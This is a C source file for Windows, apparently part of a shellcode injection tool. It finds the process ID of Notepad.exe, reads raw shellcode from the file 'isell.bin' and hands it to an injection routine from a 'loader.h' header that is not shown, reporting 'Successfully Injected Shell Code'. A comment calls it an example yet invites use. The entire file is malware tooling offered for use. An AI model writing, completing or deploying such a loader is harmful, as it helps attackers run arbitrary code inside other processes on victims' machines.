#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#include "loader.h"

//
//  This wasn't made to be used, it's just an example
//  But if you would like to use some scripts, you're more than welcome.
//

DWORD PID(const char* pname) {
    PROCESSENTRY32 proce;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hsnap == INVALID_HANDLE_VALUE) { return 0; }

    //////////////////////////////////////////////

    proce.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &proce)) {
        do {
            if (strcmp(pname, proce.szExeFile) == 0) {
                CloseHandle(hsnap);
                return proce.th32ProcessID;
            }
        } while (Process32Next(hsnap, &proce));
    }

    //////////////////////////////////////////////

    CloseHandle(hsnap);
    return 0;
}

unsigned char* Shellcode(const char *fn, size_t *size) {
    FILE *f = fopen(fn, "rb");
    if (!f) { return NULL; }

    /////////////////////////////

    fseek(f, 0, SEEK_END);
    *size = ftell(f);
    rewind(f);

    /////////////////////////////

    unsigned char *buffer = (unsigned char*)malloc(*size);
    if (!buffer) { fclose(f); return NULL; }

    /////////////////////////////

    fread(buffer, 1, *size, f);
    fclose(f);
    return buffer;
}

int main() {
    
    //////////////////////////////////////////////

    size_t size;
    const char* pname = "Notepad.exe";
    const char* payload = "isell.bin";

    unsigned char *shellcode = Shellcode(payload, &size);
    if (!shellcode) return 1;

    DWORD pid = PID(pname);
    if (pid == 0) { 
        printf("[!] Failed To Get Process ID"); 
        exit(EXIT_FAILURE); 
    }

    //////////////////////////////////////////////

    if (load(shellcode, pid)) {
        printf("[+] Successfully Injected Shell Code. | Process ID --> %d", pid);
        exit(EXIT_SUCCESS);
    }

    //////////////////////////////////////////////

    printf("[!] Failed To Inject Shell Code. | Process ID --> %d", pid);
    exit(EXIT_FAILURE);
}
